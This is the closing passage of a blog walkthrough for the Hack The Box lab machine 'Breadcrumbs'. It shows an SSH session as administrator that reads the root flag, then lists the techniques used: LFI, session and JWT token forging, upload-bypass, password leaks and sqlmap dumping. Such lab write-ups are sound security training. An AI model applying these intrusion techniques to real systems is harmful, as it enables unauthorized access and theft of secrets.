+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># ssh administrator@10.10.10.228</span></span><br><span class="line">administrator@10.10.10.228<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Microsoft Windows [Version 10.0.19041.746]</span></span><br><span class="line"><span class="string">(c) 2020 Microsoft Corporation. All rights reserved.</span></span><br><span class="line"><span class="string">                                                    </span></span><br><span class="line"><span class="string">administrator@BREADCRUMBS C:\Users\Administrator&gt;whoami</span></span><br><span class="line"><span class="string">breadcrumbs\administrator                        </span></span><br><span class="line"><span class="string">                                                 </span></span><br><span class="line"><span class="string">administrator@BREADCRUMBS C:\Users\Administrator&gt;dir</span></span><br><span class="line"><span class="string"> Volume in drive C has no label.                  </span></span><br><span class="line"><span class="string"> Volume Serial Number is 7C07-CD3A                </span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string"> Directory of C:\Users\Administrator              </span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string">01/26/2021  09:06 AM    &lt;DIR&gt;          .          </span></span><br><span class="line"><span class="string">01/26/2021  09:06 AM    &lt;DIR&gt;          ..         </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          3D Objects </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Contacts   </span></span><br><span class="line"><span class="string">02/09/2021  07:08 AM    &lt;DIR&gt;          Desktop    </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Documents  </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Downloads  </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Favorites  </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Links      </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Music      </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          OneDrive   </span></span><br><span class="line"><span class="string">01/15/2021  03:57 PM    &lt;DIR&gt;          Pictures   </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Saved Games</span></span><br><span class="line"><span class="string">01/15/2021  03:57 PM    &lt;DIR&gt;          Searches   </span></span><br><span class="line"><span class="string">01/15/2021  03:56 PM    &lt;DIR&gt;          Videos     </span></span><br><span class="line"><span class="string">               0 File(s)              0 bytes     </span></span><br><span class="line"><span class="string">              15 Dir(s)   6,308,880,384 bytes free</span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string">administrator@BREADCRUMBS C:\Users\Administrator&gt;type Desktop\root.txt</span></span><br><span class="line"><span class="string">a47ac3139f51cdd4a4d30614eb277101</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb193.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>LFI</li>
+<li>phpsessid and jwt token forge</li>
+<li>makeup file upload request package bypass upload restriction</li>
+<li>.sqlite leak password</li>
+<li>ida analyse binary file</li>
+<li>port forwarding</li>
+<li>sqlmap dump secrets</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/02/23/breadcrumbs/" title="Hack-The-Box-walkthrough[Breadcrumbs]">https://fdlucifer.github.io/2021/02/23/breadcrumbs/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/22/toxin/" rel="prev" title="Hack-The-Box-pwn-challenge[Toxin]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-pwn-challenge[Toxin]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/27/hackthebox-rope2-getroot/" rel="next" title="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">
+                  HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
